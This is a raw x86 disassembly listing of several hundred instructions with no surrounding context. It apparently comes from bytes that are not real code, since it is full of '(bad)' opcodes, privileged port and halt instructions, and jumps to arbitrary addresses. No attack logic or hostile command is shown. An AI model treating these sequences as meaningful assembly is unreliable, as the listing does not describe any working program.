  4051ab:	mov    WORD PTR [esi+0x52],ss
  4051ae:	sbb    dl,BYTE PTR [esi+0x0]
  4051b1:	mov    edi,DWORD PTR [ebx-0x16b433c1]
  4051b7:	mov    esi,0x7ba0f0ff
  4051bc:	cmp    ebp,DWORD PTR ds:0x76e06da7
  4051c2:	sti    
  4051c3:	test   eax,0x8a777ad9
  4051c8:	loopne 0x405202
  4051ca:	mov    cl,0x72
  4051cc:	xchg   esp,eax
  4051cd:	aas    
  4051ce:	ds fwait
  4051d0:	dec    edi
  4051d1:	outs   dx,BYTE PTR ds:[esi]
  4051d2:	mov    ch,0xda
  4051d4:	mov    BYTE PTR [ebx],ch
  4051d6:	int3   
  4051d7:	fadd   QWORD PTR [edx*1-0x58965a3]
  4051de:	xchg   ebx,eax
  4051df:	xchg   dh,bh
  4051e1:	dec    esi
  4051e2:	test   eax,0xef36cdf7
  4051e7:	mov    edi,0xa68576ac
  4051ec:	jb     0x40521a
  4051ee:	aas    
  4051ef:	lahf   
  4051f0:	mov    ebp,DWORD PTR [edi]
  4051f2:	fdivr  QWORD PTR [eax+0x35]
  4051f5:	retf   0xb66c
  4051f8:	push   es
  4051f9:	push   ecx
  4051fa:	jl     0x4051b9
  4051fc:	(bad)  
  4051fd:	cmp    BYTE PTR [eax-0x7a],0xb2
  405201:	lea    ecx,[edi+0x5ec7bb4c]
  405207:	mov    edx,0x340a12d1
  40520c:	fwait
  40520d:	sbb    bh,BYTE PTR [edx]
  40520f:	inc    eax
  405210:	pop    ecx
  405211:	(bad)  [eax+0x34]
  405214:	sub    BYTE PTR ss:[eax-0x52865b0b],bh
  40521b:	mov    edi,0xf7e031ff
  405220:	mov    esi,0x66456670
  405225:	inc    edi
  405226:	xor    ebx,DWORD PTR [eax-0x4177012d]
  40522c:	jbe    0x405286
  40522e:	loope  0x405263
  405230:	sti    
  405231:	test   eax,0x7e620a02
  405236:	mov    al,0x16
  405238:	(bad)
  40523c:	hlt    
  40523d:	push   edi
  40523e:	test   eax,0x2d097b8e
  405243:	and    eax,0xb7c8d381
  405248:	inc    ecx
  405249:	pop    edi
  40524a:	(bad)  
  40524b:	nop
  40524c:	jb     0x405249
  40524e:	jecxz  0x405297
  405250:	test   eax,0xe31bcc13
  405255:	icebp  
  405256:	mov    ds:0x4628fc97,eax
  40525b:	jle    0x4051f5
  40525d:	ds pop edi
  40525f:	cmp    BYTE PTR ds:0xa9884122,bl
  405265:	inc    ecx
  405266:	mov    eax,0xc6b8e06
  40526b:	cmc    
  40526c:	mov    dl,0x96
  40526e:	pop    esi
  40526f:	and    cl,dh
  405271:	(bad)  
  405272:	loop   0x405261
  405274:	cmp    eax,0x824c1599
  405279:	fcomp  QWORD PTR [edx-0x67943fee]
  40527f:	cmp    cl,BYTE PTR [esi+0xcfa4678]
  405285:	popf   
  405286:	mov    al,ds:0x217beea1
  40528b:	pop    ds
  40528c:	adc    DWORD PTR [esi],ebx
  40528e:	adc    ebp,ebx
  405290:	cs or  bl,bh
  405293:	retf   0x2d55
  405296:	(bad)  
  405297:	xor    ecx,DWORD PTR [ebx]
  405299:	fdiv   QWORD PTR [esi-0xc3205b5]
  40529f:	add    al,0x5a
  4052a1:	add    ch,bl
  4052a3:	jle    0x405258
  4052a5:	(bad)  
  4052a6:	(bad)  
  4052a8:	mov    WORD PTR [edi],?
  4052aa:	les    edi,FWORD PTR [esp+ebp*8+0x3e]
  4052ae:	hlt    
  4052af:	adc    dh,dh
  4052b1:	aas    
  4052b2:	shr    BYTE PTR [edx-0x14ce3f4],cl
  4052b8:	or     ch,BYTE PTR [eax]
  4052ba:	push   cs
  4052bb:	mov    esi,0x95021152
  4052c0:	jns    0x4052e7
  4052c2:	jmp    0x19719f47
  4052c7:	out    dx,eax
  4052c8:	js     0x4052c8
  4052ca:	dec    esi
  4052cb:	adc    al,0x54
  4052cd:	or     al,0x1e
  4052cf:	xlat   BYTE PTR ds:[ebx]
  4052d0:	inc    edi
  4052d1:	call   DWORD PTR [esi-0x6f3c78bd]
  4052d7:	(bad)  
  4052d8:	push   0xffffffea
  4052da:	fcomi  st,st(5)
  4052dc:	nop
  4052dd:	xchg   DWORD PTR [ecx+0x5c],esi
  4052e0:	mov    cl,dh
  4052e2:	jg     0x4052c0
  4052e4:	lock mov al,ds:0x1c1f8ca7
  4052ea:	popf   
  4052eb:	loop   0x40529a
  4052ed:	jbe    0x405329
  4052ef:	sti    
  4052f0:	aam    0x30
  4052f2:	sbb    eax,0xd053354f
  4052f7:	shr    BYTE PTR [ecx-0x2bb1da94],1
  4052fd:	add    cl,BYTE PTR [eax]
  4052ff:	repz (bad) 
  405301:	clc    
  405302:	add    BYTE PTR [eax+0x1e90ef54],ah
  405308:	mov    dh,0x3f
  40530a:	je     0x40529b
  40530c:	(bad)  
  40530d:	neg    BYTE PTR [eax-0x1aacb354]
  405313:	iret   
  405314:	fwait
  405315:	cwde   
  405316:	xchg   edi,eax
  405317:	pop    ebx
  405318:	nop
  405319:	xchg   eax,edi
  40531b:	cli    
  40531c:	push   0x3c
  40531e:	ins    DWORD PTR es:[edi],dx
  40531f:	add    eax,0xfee23d58
  405324:	fiadd  WORD PTR [eax]
  405326:	imul   edx,ebx,0xffffffcc
  405329:	retf   0xed8e
  40532c:	fistp  WORD PTR [edx+0x56]
  40532f:	out    dx,al
  405330:	scas   eax,DWORD PTR es:[edi]
  405331:	mov    edi,0x12cc6241
  405336:	fisttp DWORD PTR [edi]
  405338:	add    BYTE PTR [ebx+0x22],bh
  40533b:	adc    esp,DWORD PTR [ebx-0x5a]
  40533e:	arpl   WORD PTR [edi-0x1],bx
  405341:	mov    esi,DWORD PTR [eax]
  405343:	stos   BYTE PTR es:[edi],al
  405344:	push   cs
  405345:	stc    
  405346:	mov    dl,0xfc
  405348:	push   ss
  405349:	push   eax
  40534a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534b:	ficom  DWORD PTR [eax-0x1f]
  40534e:	dec    edx
  40534f:	dec    eax
  405350:	push   ebp
  405351:	inc    ebp
  405352:	add    al,0x90
  405354:	lds    esi,FWORD PTR [edx+0x49]
  405357:	shl    DWORD PTR [ecx+0x214409f6],0x7b
  40535e:	imul   ecx,eax,0xac344081
  405364:	loop   0x405396
  405366:	fs sub al,0x7
  405369:	jbe    0x405351
  40536b:	sub    eax,0x503644ff
  405370:	es adc dl,dl
  405373:	shr    BYTE PTR [esi+eiz*4+0x10],cl
  405377:	idiv   DWORD PTR [edi-0x42]
  40537a:	out    dx,eax
  40537b:	jmp    0x779def6b
  405380:	(bad)  
  405381:	lock mov bl,0x51
  405384:	cdq    
  405385:	add    edi,DWORD PTR [ebp-0x5118bdb8]
  40538b:	nop
  40538c:	and    al,0x44
  40538e:	into   
  40538f:	mov    esp,0x2596ac00
  405394:	xchg   esp,eax
  405395:	ins    BYTE PTR es:[edi],dx
  405396:	or     ebp,DWORD PTR [edi+0x61c1c4b]
  40539c:	aam    0x12
  40539e:	push   ebx
  40539f:	dec    esp
  4053a0:	push   ebp
  4053a1:	mov    ah,0x3f
  4053a3:	jmp    0xd429:0x434643e
  4053aa:	pop    ss
  4053ab:	shl    eax,1
  4053ad:	dec    eax
  4053ae:	sbb    BYTE PTR ds:0xeb60caff,cl
  4053b4:	mov    edx,0xec3c1f1
  4053b9:	sbb    al,0x16
  4053bb:	mov    al,ds:0x64ee73a4
  4053c0:	push   esp
  4053c1:	push   ds
  4053c2:	mov    al,0xc5
  4053c4:	ja     0x405436
  4053c6:	mov    ecx,0xf9c4f023
  4053cb:	in     al,0xba
  4053cd:	xchg   ebp,eax
  4053ce:	mov    al,ds:0xd58584bf
  4053d3:	ret    
  4053d4:	cmp    eax,0xa42ed7e1
  4053d9:	sub    eax,0x7d262686
  4053de:	loopne 0x405410
  4053e0:	ss pushf 
  4053e2:	and    eax,0xed300806
  4053e7:	push   ebp
  4053e8:	push   ecx
  4053e9:	sbb    ch,dl
  4053eb:	push   ss
  4053ec:	test   al,0xfa
  4053ee:	retf   
  4053ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f0:	xor    al,0xe9
  4053f2:	mov    eax,0xcf647c49
  4053f7:	xor    DWORD PTR [edx],ebx
  4053f9:	popa   
  4053fa:	dec    esp
  4053fb:	ret    0x77bb
  4053fe:	stc    
  4053ff:	stos   BYTE PTR es:[edi],al
  405400:	xor    esi,esi
  405402:	sahf   
  405403:	pop    edx
  405404:	fmul   DWORD PTR [esi-0x773dc296]
  40540a:	test   BYTE PTR [edx],ch
  40540c:	lds    eax,FWORD PTR [ecx]
  40540e:	repnz and DWORD PTR es:[edi],edi
  405412:	clc    
  405413:	inc    ebp
  405414:	call   0xaa36:0x13f8d456
  40541b:	add    esp,DWORD PTR [edi+0x55992807]
  405421:	daa    
  405422:	mov    dh,0xf4
  405424:	addr16 cli 
  405426:	dec    eax
  405427:	sbb    edx,DWORD PTR ds:0x7fb0ad8b
  40542d:	dec    edi
  40542e:	pop    ss
  40542f:	cmp    BYTE PTR [eax-0x4a281b88],bh
  405435:	or     DWORD PTR [ebx+esi*4-0x483fe300],esp
  40543c:	sahf   
  40543d:	jecxz  0x40547a
  40543f:	sbb    DWORD PTR [ecx-0x12],ebx
  405442:	(bad)  
  405443:	retf   
  405444:	jnp    0x4054af
  405446:	aas    
  405447:	nop
  405448:	mov    eax,0xc8a66d2c
  40544d:	dec    edx
  40544e:	fimul  WORD PTR [ecx+0x5e]
  405451:	sbb    DWORD PTR [edi],0xa016d708
  405457:	imul   ebx,DWORD PTR [edx],0xcda31cd6
  40545d:	outs   dx,DWORD PTR ds:[esi]
  40545e:	sub    al,0x28
  405460:	and    DWORD PTR [ebp-0x21d5d009],eax
  405466:	call   FWORD PTR ds:[edi-0x737e857a]
  40546d:	jae    0x40547e
  40546f:	mov    ecx,0xf12d5964
  405474:	xor    esp,DWORD PTR [ecx+0x7c]
  405477:	ret    0x8d19
  40547a:	mov    dh,0x11
  40547c:	stos   BYTE PTR es:[edi],al
  40547d:	mov    es,WORD PTR [edx+0x2045aa9f]
  405483:	fnstcw WORD PTR [edx-0x8a51bea]
  405489:	add    BYTE PTR [ebp+eax*4+0x69],cl
  40548d:	scas   al,BYTE PTR es:[edi]
  40548e:	mov    esi,0xd6297923
  405493:	out    0xc7,eax
  405495:	cmp    BYTE PTR [edx+0x4c03e6ff],0x51
  40549c:	cli    
  40549d:	cwde   
  40549e:	shl    BYTE PTR [ecx+edx*2+0xa],cl
  4054a2:	aad    0x72
  4054a4:	push   ecx
  4054a5:	mov    esi,0x5e8e4ab
  4054aa:	pop    ss
  4054ab:	or     eax,0xdc67acb2
  4054b0:	rol    DWORD PTR [edi],1
  4054b2:	test   BYTE PTR [edi],bh
  4054b4:	jns    0x405523
  4054b6:	pop    eax
  4054b7:	cmp    al,0x70
  4054b9:	xchg   DWORD PTR [edx+0x38f415f2],ecx
  4054bf:	mov    WORD PTR [ecx+0x60ed9233],?
  4054c5:	stc    
  4054c6:	add    BYTE PTR [edi],al
  4054c8:	push   esp
  4054c9:	and    ebx,DWORD PTR [edi+0x7c]
  4054cc:	ja     0x40545a
  4054ce:	inc    esp
  4054cf:	je     0x4054cc
  4054d1:	loope  0x4054f9
  4054d3:	add    al,BYTE PTR [ecx+0x230460c1]
  4054d9:	jb     0x405501
  4054db:	test   BYTE PTR [ecx],bh
  4054dd:	jno    0x405538
  4054df:	loop   0x405560
  4054e1:	push   esi
  4054e2:	popa   
  4054e3:	sbb    eax,0x9974087f
  4054e8:	and    ecx,DWORD PTR [esi-0x18cc0581]
  4054ee:	add    esp,DWORD PTR [ebp+0x450b1949]
  4054f4:	push   ss
  4054f5:	cli    
  4054f6:	cs in  al,dx
  4054f8:	std    
  4054f9:	jne    0x4054ff
  4054fb:	push   ebp
  4054fc:	xchg   ebp,eax
  4054fd:	pop    ebx
  4054fe:	sub    edx,DWORD PTR [eax-0x1457b366]
  405504:	outs   dx,BYTE PTR ds:[esi]
  405505:	call   0xd6557f92
  40550a:	xor    eax,0xeca5419e
  40550f:	sbb    dl,bh
  405511:	jae    0x405513
  405513:	xchg   ecx,eax
  405514:	shr    DWORD PTR [eax-0x5c24cbef],0x6f
  40551b:	mov    edx,DWORD PTR [ecx-0x17]
  40551e:	jge    0x405537
  405520:	es call 0xba13ce95
  405526:	dec    ebp
  405527:	add    bl,BYTE PTR [esp+ebx*8-0x66]
  40552b:	mov    ch,0x4
  40552d:	xor    al,0xe5
  40552f:	fiadd  DWORD PTR [edi-0x1524138e]
  405535:	or     eax,0x58c662d1
  40553a:	out    0xf7,eax
  40553c:	(bad)  
  40553d:	mov    eax,0x3a8f26d4
  405542:	mov    al,dl
  405544:	(bad)  
  405545:	into   
  405546:	mov    ds:0x12e8391,eax
  40554b:	cli    
  40554c:	mov    cl,0x7e
  40554e:	nop
  40554f:	pop    eax
  405550:	push   ds
  405551:	inc    ebx
  405552:	imul   ebp,DWORD PTR [esi-0x6d],0x2
  405556:	inc    edi
  405557:	add    eax,ecx
  405559:	sti    
  40555a:	jle    0x405515
  40555c:	(bad)  
  40555d:	(bad)  
  40555e:	mov    ebx,0xbad9e697
  405563:	retf   0x8a9a
  405566:	mov    ch,0x2a
  405568:	shl    DWORD PTR [esi],0xbf
  40556b:	adc    esi,edx
  40556d:	rcl    BYTE PTR [edi-0x25],0x60
  405571:	mov    bh,0x0
  405573:	mov    BYTE PTR [edi-0x123be6b3],0x79
  40557a:	push   edx
  40557b:	data16 loop 0x4055e4
  40557e:	jne    0x40550d
  405580:	adc    BYTE PTR [eax-0x28],al
  405583:	ja     0x4055c9
  405585:	xor    DWORD PTR [eax],edi
  405587:	popf   
  405588:	push   ecx
  405589:	xchg   edi,eax
  40558a:	cmp    cl,BYTE PTR [edx]
  40558c:	adc    DWORD PTR [ebp-0xd723375],ebx
  405592:	stc    
  405593:	pop    edx
  405594:	(bad)  
  405595:	repz je 0x4055ff
  405598:	pop    ecx
  405599:	mov    ds:0x56ee767a,al
  40559e:	out    0x43,al
  4055a0:	mov    edi,DWORD PTR [esi-0x7a]
  4055a3:	into   
  4055a4:	cmp    al,0x15
  4055a6:	in     al,0x11
  4055a8:	out    dx,eax
  4055a9:	ja     0x405601
  4055ab:	cmc    
  4055ac:	ds cmc 
  4055ae:	fbstp  TBYTE PTR [ecx+0x77]
  4055b1:	(bad)  
  4055b2:	in     al,dx
  4055b3:	and    dl,BYTE PTR [eax-0x28455523]
  4055b9:	mov    ds:0xc6e4a62d,al
  4055be:	push   ss
  4055bf:	adc    DWORD PTR [edi+edi*1+0x188bb788],ebp
  4055c6:	jl     0x4055d4
  4055c8:	mov    al,ds:0x2184f686
  4055cd:	or     al,0xf9
  4055cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055d0:	cmc    
  4055d1:	sub    al,0xb5
  4055d3:	sbb    al,0xda
  4055d5:	or     al,0xb
  4055d7:	fldenv [ebx+0x568165ba]
  4055dd:	aaa    
  4055de:	jmp    0xdb0f:0x49807c6c
  4055e5:	cmp    eax,DWORD PTR [esi-0x21]
  4055e8:	adc    cl,BYTE PTR [eax-0x38c77d40]
  4055ee:	lea    esp,[edi]
  4055f0:	cmp    DWORD PTR [edx-0x236bf7c4],edx
  4055f6:	inc    edx
  4055f7:	(bad)  
  4055f9:	sbb    al,0xf1
  4055fb:	sar    DWORD PTR [edi+ebp*2+0x5],0x4d
  405600:	inc    eax
  405601:	and    ax,0xe9d7
  405605:	adc    BYTE PTR [esi],ch
  405607:	bound  esi,QWORD PTR [esi-0x2f]
  40560a:	or     BYTE PTR [ebp-0x7e292506],cl
  405610:	mov    ecx,fs
  405612:	lock stos BYTE PTR es:[edi],al
  405614:	xchg   esi,eax
  405615:	int3   
  405616:	sbb    eax,0x80cae24
  40561b:	daa    
  40561c:	cmp    BYTE PTR [esp+ebp*2-0x1abb70],dl
  405623:	out    dx,eax
  405624:	clc    
  405625:	(bad)  
  405626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405627:	pop    ebx
  405628:	fcomp  QWORD PTR [ecx+0x2]
  40562b:	sbb    ebp,DWORD PTR [edi-0x26]
  40562e:	and    dl,BYTE PTR [edx+ecx*4+0x202f524d]
  405635:	sar    esp,0x2b
  405638:	cmp    eax,0x94901a37
  40563d:	sub    eax,0x2551c0e
  405642:	gs sahf 
  405644:	lea    ebp,[edi]
  405646:	hlt    
  405647:	je     0x405676
  405649:	popf   
  40564a:	xchg   ebp,eax
  40564b:	adc    BYTE PTR [ebp-0x61c537f9],ah
  405651:	rcl    BYTE PTR [ebx],1
  405653:	hlt    
  405654:	jl     0x4056bb
  405656:	xchg   edx,eax
  405657:	test   al,0xfa
  405659:	aas    
  40565a:	xor    dh,BYTE PTR [ebp+0x4d95933d]
  405660:	xor    ebp,esi
  405662:	test   al,0x6a
  405664:	dec    ecx
  405665:	call   0x8199:0x88543844
  40566c:	xor    DWORD PTR [eax+eax*8+0xa],0x1d
  405671:	cmp    BYTE PTR [ecx+0x37],ch
  405674:	and    dl,BYTE PTR [ecx-0x71]
  405677:	popf   
  405678:	jbe    0x405692
  40567a:	xchg   edx,eax
  40567b:	push   DWORD PTR [ebx-0x73b773ba]
  405681:	ret    
  405682:	in     eax,dx
  405683:	xor    cl,ah
  405685:	fstp   QWORD PTR [ebx+0x17f4ba1e]
  40568b:	ins    DWORD PTR es:[edi],dx
  40568c:	mov    esp,DWORD PTR [edx-0x6e]
  40568f:	not    DWORD PTR [esi+0x68]
  405692:	call   0x1a1e3782
  405697:	add    eax,0x9caa2be0
  40569c:	adc    ecx,esi
  40569e:	stos   BYTE PTR es:[edi],al
  40569f:	adc    BYTE PTR [ebx+0x70],ch
  4056a2:	mov    ebx,0x20dfb0ad
  4056a7:	sar    BYTE PTR [ebx+0x7515341c],1
  4056ad:	add    eax,0xbd66e09a
  4056b2:	dec    ecx
  4056b3:	mov    ds:0x19c71218,al
  4056b8:	ja     0x405722
  4056ba:	sbb    esp,ebx
  4056bc:	pop    esi
  4056bd:	and    ah,BYTE PTR [edi+0x3d]
  4056c0:	inc    edi
  4056c1:	neg    BYTE PTR [edi-0x132a302d]
  4056c7:	cs stos DWORD PTR es:[edi],eax
  4056c9:	stos   DWORD PTR es:[edi],eax
  4056ca:	push   edi
  4056cb:	or     ah,BYTE PTR ds:0x7706d14f
  4056d1:	mov    DWORD PTR es:[ebx+0x4c],esp
  4056d5:	call   0x32dc:0x33f0bae6
  4056dc:	test   al,0x22
  4056de:	or     al,bh
  4056e0:	loope  0x40568d
  4056e2:	mov    bl,0xda
  4056e4:	inc    eax
  4056e5:	inc    ebx
  4056e6:	jo     0x405725
  4056e8:	loopne 0x405686
  4056ea:	push   es
  4056eb:	or     cl,ch
  4056ed:	sub    bh,BYTE PTR [ebp-0x167ef0b0]
  4056f3:	enter  0x4e99,0xcc
  4056f7:	inc    edx
  4056f8:	aas    
  4056f9:	into   
  4056fa:	jbe    0x40574e
  4056fc:	jne    0x4056de
  4056fe:	xchg   esi,eax
  4056ff:	xchg   ebp,eax
  405700:	out    0x6e,eax
  405702:	cld    
  405703:	ins    BYTE PTR es:[edi],dx
  405704:	xchg   al,dl
  405706:	push   edx
  405707:	sar    DWORD PTR [edi],1
  405709:	mov    ecx,0xd2ea9e1c
  40570e:	ret    0xd162
  405711:	or     eax,0x9b1e76e7
  405716:	and    eax,0x81fb1d4
  40571b:	inc    ecx
  40571c:	imul   esi,ebp,0xffffffe2
  40571f:	test   ebx,ebx
  405721:	sbb    cl,BYTE PTR [ecx-0x10585143]
  405727:	lods   al,BYTE PTR ds:[esi]
  405728:	mov    ebx,0x2d081291
  40572d:	sbb    BYTE PTR [ebx+ebp*2-0x449d7d34],bh
  405734:	mul    ebp
  405736:	std    
  405737:	push   ebp
  405738:	hlt    
  405739:	imul   esp,DWORD PTR [eax-0x60],0xffffffaf
  40573d:	arpl   bp,cx
  40573f:	jno    0x4056d4
  405741:	add    DWORD PTR [eax],0x40
  405744:	mov    edx,0xc9f1d76a
  405749:	pop    edx
  40574a:	mov    dl,0xd1
  40574c:	jb     0x4057b2
  40574e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40574f:	cmp    al,0x94
  405751:	mov    ds:0x79c00a94,al
  405756:	outs   dx,BYTE PTR ds:[esi]
  405757:	(bad)  
  405758:	pop    edi
  405759:	xor    edi,DWORD PTR [ebx+0x546d6115]
  40575f:	mov    ebp,DWORD PTR [edi]
  405761:	jae    0x405740
  405763:	mov    dh,0xae
  405765:	ror    BYTE PTR [eax+0x65],1
  405768:	or     ebp,edx
  40576a:	sbb    edx,ebp
  40576c:	mov    ch,0x91
  40576e:	push   ecx
  40576f:	pushf  
  405770:	lahf   
  405771:	int3   
  405772:	add    DWORD PTR [ebp-0x63],esp
  405775:	imul   eax,ecx,0x4c
  405778:	(bad)  
  405779:	xor    eax,DWORD PTR [eax+0x60f062c8]
  40577f:	fmul   QWORD PTR [edx+0x1e3d2589]
  405785:	repnz lahf 
  405787:	lods   eax,DWORD PTR ds:[esi]
  405788:	sahf   
  405789:	sbb    al,BYTE PTR [edx+0x6bb8628d]
  40578f:	push   0xffffffa1
  405791:	sbb    DWORD PTR [ecx-0x2],ebp
  405794:	into   
  405795:	imul   ecx,DWORD PTR [ebp+eiz*4+0x73ab7f3d],0xbf8a0b7c
  4057a0:	out    dx,al
  4057a1:	or     al,0x37
  4057a3:	bnd jns 0x4057f8
  4057a6:	xchg   edx,eax
  4057a7:	hlt    
  4057a8:	hlt    
  4057a9:	adc    al,0x72
  4057ab:	inc    esi
  4057ac:	adc    esp,DWORD PTR [ebx+eax*8+0x36]
  4057b0:	sub    al,0x4e
  4057b2:	int3   
  4057b3:	test   al,0xe5
  4057b5:	jmp    DWORD PTR ds:0x1e177796
  4057bb:	(bad)  
  4057bc:	sbb    bl,BYTE PTR [ebx-0x219e6856]
  4057c2:	out    dx,al
  4057c3:	shl    DWORD PTR [esi+0x1bdafb99],0xdb
  4057ca:	sub    DWORD PTR [esi],0xf961fb5b
  4057d0:	mov    eax,ds:0x8b856f91
  4057d5:	xchg   ebp,eax
  4057d6:	hlt    
  4057d7:	pop    ecx
  4057d8:	gs inc edi
  4057da:	int    0xc0
  4057dc:	div    DWORD PTR [edx-0x3e6a9307]
  4057e2:	pop    es
  4057e3:	dec    ecx
  4057e4:	dec    esp
  4057e5:	pusha  
  4057e6:	push   esi
  4057e7:	push   edx
  4057e8:	push   ebx
  4057e9:	aam    0x98
  4057eb:	pop    esp
  4057ec:	nop
  4057ed:	and    edi,esp
  4057ef:	push   es
  4057f0:	dec    esp
  4057f1:	xchg   ecx,eax
  4057f2:	jg     0x4057d2
  4057f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057f5:	push   ecx
  4057f6:	scas   eax,DWORD PTR es:[edi]
  4057f7:	clc    
  4057f8:	data16 or al,BYTE PTR [edi+0x6c]
  4057fc:	pop    ds
  4057fd:	(bad)  
  4057fe:	pop    ss
  4057ff:	and    DWORD PTR [edx],0x2b0f4c3a
  405805:	push   es
  405806:	aas    
  405807:	call   0xe8e3c626
  40580c:	bound  esi,QWORD PTR [edx]
  40580e:	lods   al,BYTE PTR ds:[esi]
  40580f:	xchg   ebp,eax
  405810:	or     BYTE PTR [edi+0x60],bl
  405813:	xchg   ebp,eax
  405814:	sbb    esp,DWORD PTR [ebx+0x3a2e5b9f]
  40581a:	(bad)
  40581d:	push   esp
  40581e:	enter  0x4009,0xee
  405822:	push   edi
  405823:	test   al,bh
  405825:	and    eax,0x7df1ebd0
  40582a:	sub    DWORD PTR [edi-0x36583b73],ebp
  405830:	hlt    
  405831:	sbb    ch,BYTE PTR ds:0x5b753362
  405837:	adc    ebx,DWORD PTR [edx-0x58]
  40583a:	or     ecx,ebp
  40583c:	sub    dh,0x4b
  40583f:	in     al,dx
  405840:	pop    esi
  405841:	mov    esp,0xe352ceeb
  405846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405848:	fdiv   QWORD PTR [edi]
  40584a:	pop    edi
  40584b:	sub    edx,DWORD PTR [ebx]
  40584d:	jp     0x40584b
  40584f:	sbb    al,0xf3
  405851:	aad    0x94
  405853:	je     0x405810
  405855:	addr16 push cs
  405857:	shl    DWORD PTR [ebx],1
  405859:	jl     0x405825
  40585b:	xchg   BYTE PTR [ebx+edi*4-0x32f9ff6b],bh
  405862:	adc    al,0xb4
  405864:	cmp    DWORD PTR [ebx+0x203f52f3],esp
  40586a:	push   edx
  40586b:	call   0xa42a:0xdaeb2f9e
  405872:	pop    ecx
  405873:	jp     0x40580a
  405875:	jns    0x405813
  405877:	xor    eax,0xcea13524
  40587c:	sbb    eax,DWORD PTR [esi]
  40587e:	sub    DWORD PTR [eax-0x33],edx
  405881:	imul   eax,edi,0x68
  405884:	mov    esp,0x98a4535d
  405889:	outs   dx,DWORD PTR ds:[esi]
  40588a:	iret   
  40588b:	retf   0x932b
  40588e:	test   BYTE PTR [ecx-0x56a18f3b],dl
  405894:	mov    edi,DWORD PTR [ebp+0x5d]
  405897:	sub    DWORD PTR [ebp-0x5d],edi
  40589a:	jnp    0x405844
  40589c:	std    
  40589d:	ins    BYTE PTR es:[edi],dx
  40589e:	mov    eax,DWORD PTR es:[si+0x88c]
  4058a4:	and    ebp,DWORD PTR [ecx]
  4058a6:	mov    ?,WORD PTR [edi+ecx*2+0x3036d63f]
  4058ad:	sbb    al,0xb1
  4058af:	sbb    BYTE PTR [esi],ch
  4058b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058b2:	aam    0x4b
  4058b4:	push   cs
  4058b5:	repnz pop edi
  4058b7:	dec    ebp
  4058b8:	loop   0x4058c1
  4058ba:	cmp    al,0x82
  4058bc:	pop    edx
  4058bd:	jmp    0x68d5fe94
  4058c2:	(bad)  
  4058c3:	xchg   ebp,eax
  4058c4:	cmp    BYTE PTR [edx+0x6dbff9a],al
  4058ca:	out    dx,al
  4058cb:	addr16 mov ebx,0x1ccbd9ae
  4058d1:	sub    esp,DWORD PTR [ebx-0x1e82cfa3]
  4058d7:	lods   eax,DWORD PTR ds:[esi]
  4058d8:	out    0x7f,eax
  4058da:	test   al,0x54
  4058dc:	xchg   ebx,ebp
  4058de:	jne    0x4058aa
  4058e0:	dec    eax
  4058e1:	add    DWORD PTR [ebp+0xa],edx
  4058e4:	hlt    
  4058e5:	mov    bh,BYTE PTR [esi]
  4058e7:	cmp    eax,0xeb33342e
  4058ed:	test   BYTE PTR [ebx+0x271eb38c],bl
  4058f3:	repz aas 
  4058f5:	jge    0x405950
  4058f7:	pop    ebx
  4058f8:	mov    ch,0x9c
  4058fa:	xor    DWORD PTR [esp+edx*1],ebx
  4058fd:	xlat   BYTE PTR ds:[ebx]
  4058fe:	pop    ebx
  4058ff:	mov    al,ds:0xc3800020
  405904:	stos   BYTE PTR es:[edi],al
  405905:	pop    ss
  405906:	xor    al,0xc6
  405908:	or     eax,0xaa4df480
  40590d:	push   esp
  40590e:	cmp    al,0x2f
  405910:	jns    0x405927
  405912:	push   0xffffffac
  405914:	sub    ah,bl
  405916:	cmp    edi,DWORD PTR [ebx]
  405918:	bound  esi,QWORD PTR [edx]
  40591a:	cli    
  40591b:	out    dx,al
  40591c:	adc    edx,DWORD PTR [ebx+ebp*1-0x3834be95]
  405923:	mov    ds:0xe9bd4dd7,eax
  405928:	xchg   ebp,eax
  405929:	inc    ebx
  40592a:	sub    eax,0xd151610f
  40592f:	pusha  
  405930:	jl     0x4059b0
  405932:	mov    bh,BYTE PTR [esi+0x677d1893]
  405938:	cmp    DWORD PTR [edx-0x2c],ebp
  40593b:	lds    ebx,FWORD PTR [ebx+0x2b]
  40593e:	xor    eax,0xe322c204
  405943:	mov    eax,0x53c07cfd
  405948:	clc    
  405949:	mov    ah,0x53
  40594b:	dec    esi
  40594c:	loop   0x405910
  40594e:	fsubr  DWORD PTR [ebx]
  405950:	xor    ebx,DWORD PTR [ebx-0x4b]
  405953:	push   ecx
  405954:	xor    edx,eax
  405956:	mov    edx,0xde986ef3
  40595b:	lds    ebp,FWORD PTR [edx-0x47]
  40595e:	outs   dx,DWORD PTR ds:[esi]
  40595f:	mov    edx,0x1f77d28d
  405964:	in     eax,dx
  405965:	aam    0xa9
  405967:	fld    DWORD PTR [ecx]
  405969:	push   eax
  40596a:	xchg   ecx,eax
  40596b:	sahf   
  40596c:	sahf   
  40596d:	(bad)  
  40596e:	xor    cl,bl
  405970:	and    ax,0x9fdd
  405974:	mov    esp,0x3a2dfffe
  405979:	pop    es
  40597a:	repnz test DWORD PTR [edi+edi*1],edx
  40597e:	xor    DWORD PTR [edi+0x78],ebp
  405981:	mov    dh,0xaa
  405983:	sbb    al,0xea
  405985:	jmp    0x1f70:0x27b457de
  40598c:	xor    bh,al
  40598e:	mov    al,0xa5
  405990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405991:	rol    DWORD PTR [edx+0x1209943b],1
  405997:	ins    BYTE PTR es:[edi],dx
  405998:	mov    ds:0xfa0ab5f1,eax
  40599d:	push   cs
  40599e:	sahf   
  40599f:	(bad)  
  4059a0:	push   edx
  4059a1:	adc    DWORD PTR [edi+eax*2+0x1b9afed3],0xf6ef8944
  4059ac:	sbb    ebx,DWORD PTR [ebx+edi*1+0x4f2e8bd]
  4059b3:	or     BYTE PTR ss:[ecx+ebx*1+0x3b68399b],bh
  4059bb:	jo     0x40593d
  4059bd:	lods   eax,DWORD PTR ds:[esi]
  4059be:	add    DWORD PTR [esi+edi*4],esp
  4059c1:	psubusw mm1,QWORD PTR [esi-0x76]
  4059c5:	out    0xcd,eax
